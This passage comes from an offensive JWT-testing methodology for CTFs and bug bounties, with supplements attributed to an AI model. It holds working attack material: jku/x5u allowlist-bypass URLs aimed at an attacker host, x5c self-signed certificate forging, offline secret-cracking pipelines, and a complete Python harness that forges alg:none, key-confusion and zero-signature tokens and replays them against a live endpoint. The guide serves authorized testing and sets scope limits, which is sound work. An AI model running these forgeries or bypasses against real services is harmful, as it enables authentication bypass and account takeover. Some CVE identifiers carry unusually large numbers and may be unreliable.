- **Goal.** CTF: read the flag / reach `role:admin` / `is_admin:true` on *one* box — forge freely, no rules of engagement, impact is "I got the flag." Bounty: prove acceptance with a token for an account *you control*, escalate to a second account you own only as far as the program allows, and stop. Never forge into a stranger's identity to "prove" it.
- **Reconnaissance.** CTF hands you the key, the source, or an obvious hint. Bounty makes key acquisition (2.6) and library fingerprinting (2.10) the actual work — most of the engagement is deciding whether a row is even demonstrable.
- **Tooling hygiene.** In a CTF, pasting a token into jwt.io is fine — it is your token, on a throwaway box. In a bounty, a target-issued token is a live bearer credential; **never** paste it into jwt.io or any hosted debugger (Appendix B). Decode locally.
- **Typical stacks.** CTF authors reach for Flask + PyJWT, Express + `jsonwebtoken`, or PHP + firebase/php-jwt — so the §2.11–2.15 defaults are exactly the planted bugs. Recognizing the stack often *is* the solve.

**A representative CTF chain** (and why it is a chain, not one bug): decode → see `alg:RS256`, `kid:"keys/live.pem"` → fetch `/keys/live.pem` from the web root (it is served) → RS→HS confuse with that PEM as the HMAC secret → flip `role` to `admin` → 200, flag. Four steps, each a matrix row; the box is "solved" the instant any one of them is the author's intended gap. On a bounty the same chain stalls at step 2 (the key is not served) unless you find it through 2.6 — which is the whole difference.

---

## Supplement 4 (2026-11-19) — post-exploitation evidence capture and reporting craft

A forged-token finding is only as good as the proof that the *server accepted a token you wrote*. Capture, in one tight package:

1. **The forged token, verbatim** — the full `header.payload.signature` string, plus a decode of each segment so the triager sees the tampered claim without re-running your tools. For `alg:none` show the trailing-dot shape; for confusion show which key bytes became the HMAC secret.
2. **The baseline pair.** The intact token's response and the one-byte-flipped token's response (Phase 1.4) — this proves verification normally runs, so acceptance of your forgery is a real bypass, not an unauthenticated endpoint.
3. **The acceptance pair.** The forged request and its 200, beside the same request with the forgery broken returning 401. Two requests, one diff.
4. **Minimal identity proof.** First a forged token for *your own* account (proves acceptance), then a `sub`/`role` swap to a second account *you control* (proves impersonation). Stop there. Do not forge into an uninvolved user to demonstrate reach — describe the reach instead.

**Distinguish the root cause in the title**, because remediation differs: "signature not verified" (matrix rows 1–2), "algorithm not pinned / `none` accepted" (row 3), "RS→HS confusion — public key used as HMAC secret" (row 4, name the library CVE from §2.11–2.15 if version-matched), "`kid` injection" (row 10), "header-supplied key trusted" (row 9). A triager who sees the exact class and the CVE closes faster and pays truer.

```bash
# One-shot evidence bundle for a confusion finding — saves the artifacts a report needs
jwt_tool.py "$FORGED" -R > forged.decoded.txt          # decoded header/payload/claims + lifetime
printf '%s\n' "$FORGED" > forged.token.txt             # the exact string, for copy-paste PoC
curl -s -D baseline.headers -o baseline.body \
  https://api.example.com/api/me -H "Authorization: Bearer $REAL"      # intact
curl -s -D forged.headers   -o forged.body \
  https://api.example.com/api/me -H "Authorization: Bearer $FORGED"    # forged — expect 200
diff <(head -1 baseline.headers) <(head -1 forged.headers)            # status-line delta = the proof
```

**Cleanup and restraint.** Delete any test accounts you registered (especially cross-service accounts from a 2.9 relay). Never exfiltrate more than the single record your PoC needs; a forged-admin token can read everything, which is exactly why you read *one* object and describe the rest. If a `jku`/`x5u` probe hit your callback host, include the request log line (timestamp, source IP, requested path) — it is the cleanest possible evidence of a verifier fetching attacker-controlled key material.

---

## Supplement 5 (2026-11-19) — key-source steering and secret-recovery craft

*Extends Phase 2.4 (cracking) and 2.6 (header-supplied keys) with the bypass and workflow detail those rows compress into a line. A verifier that "validates" the `jku` host, or a secret that "looks random," both fall more often than the one-liners suggest.*

### 5.1 Defeating a `jku`/`x5u` host allowlist

The common defense against the Phase 2.6 fetch attack is a host allowlist: the verifier fetches the JWKS only if the `jku` host matches an expected domain (e.g. `auth.example.com`). That check is URL-parsing, and URL parsing is where it loses. Try these in order against any allowlist-gated fetcher — the goal is a `jku` the allowlist reads as trusted but the HTTP client resolves to your host:

```
# Embedded credentials — parser reads host as auth.example.com, client connects to attacker
https://auth.example.com@attacker.example/jwks.json
https://attacker.example/jwks.json#@auth.example.com     # fragment confusion (reverse)

# Open redirect on the trusted host — allowlist passes, redirect lands on you
https://auth.example.com/redirect?url=https://attacker.example/jwks.json

# Host-component confusion the allowlist substring-matches
https://auth.example.com.attacker.example/jwks.json       # suffix
https://attacker.example/auth.example.com/jwks.json       # path, if the check is "contains"

# Parser desync: different components for allowlist vs. fetch
https://attacker.example\.auth.example.com/jwks.json      # backslash read as '/' by some clients
https://auth.example.com%2f.attacker.example/jwks.json    # encoded-slash host split
```

The highest-yield of these is the **open redirect on the trusted host** chained into `jku`: it needs no parser bug, only a redirect the allowlist already trusts, and the fetcher following a 302 to your JWKS is the whole exploit. If the verifier allowlists but does *not* follow redirects, you still have the SSRF callback (the fetch itself) as a Medium. PortSwigger's JWK/JKU labs are the canonical practice ground; the difference in a bounty is that you must *find* the redirect and confirm the fetcher follows it, not assume it.

### 5.2 `x5c` certificate-chain injection

`x5c` carries an X.509 cert chain (base64 DER, not base64url) in the header. A verifier that trusts the leaf cert's public key *without* validating the chain to a pinned CA will accept a self-signed cert you generate — forge by signing with the matching private key:

```bash
openssl req -x509 -newkey rsa:2048 -keyout x5c.key -out x5c.crt -days 2 -nodes \
  -subj "/CN=auth.example.com"                      # self-signed, CN mimics the real issuer
# DER-encode the cert, base64 (standard, no url-safe), strip headers -> the x5c[0] entry
openssl x509 -in x5c.crt -outform DER | base64 -w0
```

Build a header `{"alg":"RS256","x5c":["<that base64>"]}`, sign the token with `x5c.key`. Acceptance means the verifier adopted your embedded cert's key — identical impact to embedded `jwk` (2.6), different header. The chain-validation variant: some verifiers check that `x5c[0]` chains to `x5c[-1]` but never that `x5c[-1]` is a *trusted* root, so a fully self-consistent attacker chain passes. jwt_tool and Burp's JWT Editor both build the `x5c` form; verify your base64 is standard (`+/`), not base64url, or the DER decode fails silently and you misread the 401 as "secure."

### 5.3 Secret-recovery workflow beyond one wordlist

Phase 2.4 is the single `hashcat -m 16500` line; the real crack is a pipeline. Order by cost:

1. **Zero-cost candidates first.** Default/example secrets from the framework's docs and quickstarts (`your-256-bit-secret`, `supersecret`, `changeme`, `secret`, the literal from the JWT library's README), the project's own repo (`.env.example`, `config.*`, CI YAML, container `ENV`), and leaked configs. A target on a published default is an instant Critical — try these by hand before any GPU.
2. **JWT-tuned wordlists.** `jwt.secrets.list` (ships with jwt_tool), and the SecLists JWT entries beat rockyou for this class — they carry the ecosystem's actual defaults.
3. **Rules amplify.** `hashcat -m 16500 jwt.txt wordlist -r best64.rule` (newer hashcat ships the ruleset as `best66.rule`); for longer guesses, `-a 3` mask attacks on a known prefix.
4. **Alternative crackers** when hashcat is unavailable: `john --format=HMAC-SHA256` on the token, or `c-jwt-cracker` for a pure brute force of short secrets. All three are **offline, on a dumped token** — never against the live endpoint.

Crackability triage: HS256 with a short or dictionary-derived secret is realistically crackable; a 256-bit random secret is not, and burning days of GPU on it is wasted effort — note "secret not recovered within budget" and move on. A recovered secret is not just this token: re-sign *any* claim set with `jwt_tool -T -S hs256 -p "<secret>"`, and it explains every future token the service issues.

### 5.4 Claim-timing and leeway abuse (extends 2.5)

Beyond "is `exp` enforced," the timing checks have their own gaps:

- **Leeway windows.** Many libraries accept a configurable clock-skew leeway (PyJWT `leeway=`, others default 0–60s). A large leeway (minutes) silently extends every token's life past its `exp` — probe by replaying a token a little after expiry and binary-searching the acceptance boundary. A multi-minute leeway on short-lived tokens is a reportable weakening.
- **`iat` in the future / unchecked.** `iat` (issued-at) is often not validated at all; where it is, a future `iat` can sidestep "token too old" logic. `nbf` (not-before) in the future is the mirror — a token that should not yet be valid being accepted is the same class as expiry-not-enforced.
- **`exp` present but ignored on one path.** The claim is enforced on the main verify path but skipped on a refresh, websocket upgrade, or cached-introspection path. Test the *same* expired token across every channel from Phase 1.1 — enforcement is per-code-path, not per-token.
- **Absolute vs. idle lifetime.** A token with a short `exp` that is transparently re-minted forever (sliding session with no absolute cap) is a long-lived credential wearing a short-lived costume; note it alongside refresh-rotation findings.

---

## Supplement 6 (2026-11-19) — a single-request forge-and-replay harness

*Extends the Phase 2 matrix with a runnable, dependency-free executor. For an agent working a token: it forges the keyless/public-material variants and replays each **once**, printing a verdict per row. Pure stdlib — no PyJWT, no network library beyond `urllib` — so it runs anywhere and never touches a wordlist or the live endpoint more than one request per variant. Keyless rows only (none, zero-sig, empty-payload) plus the RS→HS confusion when you supply the public key; cracking and `kid`/`jku` steering stay in their own phases because they need offline work or an attacker host.*

```python
#!/usr/bin/env python3
# Usage: python3 -I jwt_forge_probe.py <URL> <TOKEN> [pubkey.pem]
# Replays the intact token for a 200 baseline, then one forged variant per row.
import sys, json, base64, hmac, hashlib, urllib.request, urllib.error

url, token = sys.argv[1], sys.argv[2]
pub = open(sys.argv[3], "rb").read() if len(sys.argv) > 3 else None

def b64u(b):  # base64url, no padding
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def seg(d):   # dict -> compact base64url JSON segment
    return b64u(json.dumps(d, separators=(",", ":")).encode())

def unb64u(s):  # decode base64url with correct padding
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))

h, p, _ = token.split(".")
hdr = json.loads(unb64u(h))
pay = json.loads(unb64u(p))
pay_evil = {**pay, **{k: "admin" for k in ("role", "scope") if k in pay}}  # escalate claims you already see

def forge_none():
    return seg({**hdr, "alg": "none"}) + "." + seg(pay_evil) + "."
def forge_hs_confusion():
    if not pub: return None
    body = (seg({**hdr, "alg": "HS256"}) + "." + seg(pay_evil)).encode()
    sig = hmac.new(pub, body, hashlib.sha256).digest()  # public key bytes AS the HMAC secret
    return body.decode() + "." + b64u(sig)
def forge_es_zero():
    return seg({**hdr, "alg": "ES256"}) + "." + seg(pay_evil) + "." + ("A" * 86)  # 64 zero bytes
def forge_empty_payload():
    return seg({**hdr, "alg": "none"}) + "." + seg({}) + "."

def replay(tok):  # ONE request; returns status
    req = urllib.request.Request(url, headers={"Authorization": "Bearer " + tok})
    try:
        return urllib.request.urlopen(req, timeout=10).status
    except urllib.error.HTTPError as e:
        return e.code

base = replay(token)
print(f"baseline (intact token): {base}")
for name, fn in [("alg:none", forge_none), ("RS->HS confusion", forge_hs_confusion),
                 ("ES256 zero-sig", forge_es_zero), ("empty payload {}", forge_empty_payload)]:
    t = fn()
    if t is None:
        print(f"{name:20} SKIP (no pubkey supplied)"); continue
    code = replay(t)
    verdict = "*** ACCEPTED — FINDING ***" if code == base == 200 else "rejected"
    print(f"{name:20} {code}   {verdict}")
```

```
# Expected on a secure verifier — every forged row bounces:
baseline (intact token): 200
alg:none             401   rejected
RS->HS confusion     401   rejected
ES256 zero-sig       401   rejected
empty payload {}     401   rejected
# Any row printing 200 / ACCEPTED is a Critical: capture that exact token per Supplement 4 and stop.
```

Run it with `-I` (isolated mode) per the environment's untrusted-input discipline, and point it only at an endpoint your Phase 1.2 scoping proved the token actually gates. It forges claims (`role`/`scope` → `admin`) only for an account you already hold; do not aim the escalation at another identity to "confirm" it — that is the line Supplement 3 draws between a CTF and a program. The harness is a fast triage, not a replacement for jwt_tool's depth: once a row flags, switch to `jwt_tool`/Burp JWT Editor to build the reportable PoC and to run the rows this script deliberately omits.

---

## References (Supplement 2–6, added 2026-11-19)

- NVD, CVE-2022-29217 (PyJWT key confusion, non-blocklisted public key formats; fix 2.4.0) — https://nvd.nist.gov/vuln/detail/CVE-2022-29217
- GHSA-ffqj-6fqr-9h24, PyJWT key confusion — https://github.com/jpadilla/pyjwt/security/advisories/GHSA-ffqj-6fqr-9h24
- CVE-2024-53861 (PyJWT issuer partial/substring match; fix 2.10.1) — https://bugzilla.redhat.com/show_bug.cgi?id=2329527
- GHSA-ffc3-869f-jxw9 / CVE-2026-102268 (PyJWT mutated-PEM confusion; fix 2.14.0) — https://github.com/advisories/GHSA-ffc3-869f-jxw9
- NVD, CVE-2024-33663 (python-jose algorithm confusion, ECDSA/DER) — https://nvd.nist.gov/vuln/detail/cve-2024-33663
- GHSA-cjwg-qfpm-7377, python-jose JWE decode DoS (CVE-2024-33664) — https://github.com/advisories/GHSA-cjwg-qfpm-7377
- OSV / Red Hat, CVE-2026-85394 (python-jose DER public key as HMAC secret; no fixed release) — https://access.redhat.com/security/cve/cve-2026-85394
- NVD, CVE-2022-23540 (node jsonwebtoken `none` fallback; fix 9.0.0) — https://nvd.nist.gov/vuln/detail/cve-2022-23540
- NVD, CVE-2022-23541 (node jsonwebtoken key-retrieval type confusion) — https://nvd.nist.gov/vuln/detail/CVE-2022-23541
- cybersecurity-help, node-jsonwebtoken multi-CVE advisory (23529/23540/23541, fix 9.0.0) — https://www.cybersecurity-help.cz/vdb/SB2023011632
- NVD, CVE-2020-26160 (golang jwt-go `aud` array verification bypass) — https://nvd.nist.gov/vuln/detail/cve-2020-26160
- GO-2025-3553 / CVE-2025-30204 (golang-jwt header-parse memory DoS; fix 4.5.2 / 5.2.2) — https://pkg.go.dev/vuln/GO-2025-3553
- NVD, CVE-2021-46743 (firebase/php-jwt `kid` key/algorithm type confusion; fix 6.0.0) — https://nvd.nist.gov/vuln/detail/CVE-2021-46743
- GHSA-h533-5v22-8vcp (firebase/php-jwt `none` treated as valid) — https://osv.dev/vulnerability/GHSA-h533-5v22-8vcp
- CVE-2026-45363 (ruby-jwt empty-key HMAC accepted; fix 2.10.3 / 3.2.0) — https://access.redhat.com/security/cve/CVE-2026-45363
- CVE-2022-21449 (ECDSA "psychic signature" all-zero, JDK; the ES256 zero-sig class) — https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/
- PortSwigger Web Security Academy, JWT attacks (jwk/jku/kid injection labs, jku host-allowlist bypass) — https://portswigger.net/web-security/jwt
- PortSwigger, JWK/JKU header injection labs — https://portswigger.net/web-security/jwt/algorithm-confusion
- Intigriti, exploiting JWT vulnerabilities (kid traversal / SQLi field notes) — https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-jwt-vulnerabilities
- ticarpi jwt_tool wiki, attack methodology and exploit modes (`-X a/k/s`, `-C`, `-T`) — https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology
- SecLists, JWT secret wordlists — https://github.com/danielmiessler/SecLists
- hashcat mode 16500 (JWT, HMAC-SHA) reference — https://hashcat.net/wiki/doku.php?id=example_hashes
- CVE-2015-9235 (node-jsonwebtoken original RS256→HS256 confusion) — https://nvd.nist.gov/vuln/detail/CVE-2015-9235
- CVE-2026-32597 (PyJWT unknown `crit` header extensions accepted; fix 2.12.0; PyJWT Sept-2026 advisory cluster) — https://nvd.nist.gov/vuln/detail/CVE-2026-32597
- CVE-2026-101918 (PyJWT nested-JSON RecursionError DoS; fix 2.15.0; PyJWT Sept-2026 advisory cluster) — https://nvd.nist.gov/vuln/detail/CVE-2026-101918
- CVE-2026-102271 (PyJWT DER-key confusion variant; fix 2.15.0) — https://nvd.nist.gov/vuln/detail/CVE-2026-102271

*Supplement added 2026-11-19 by claude-opus-4-8: library-specific verification footguns (python-jose, PyJWT, node jsonwebtoken, golang-jwt, firebase/php-jwt, ruby-jwt) with CVE numbers and version floors (Supplement 2); algorithm-allowlist bypass craft (2.16); a CTF-vs-bounty contrast block (Supplement 3); post-exploitation evidence capture (Supplement 4); jku/x5u host-allowlist bypass, x5c chain injection, secret-recovery workflow, and claim-timing/leeway abuse (Supplement 5); and a dependency-free forge-and-replay harness (Supplement 6). Sources: NVD and GitHub Security Advisories (GHSA) for every CVE, Red Hat / OSV / Go vuln DB where NVD was thin, PortSwigger Web Security Academy, Intigriti, and the jwt_tool wiki for field/CTF technique; each CVE re-verified against its primary advisory at write time. Extends Phases 2–4; no existing content altered beyond the frontmatter version/provenance bump.*
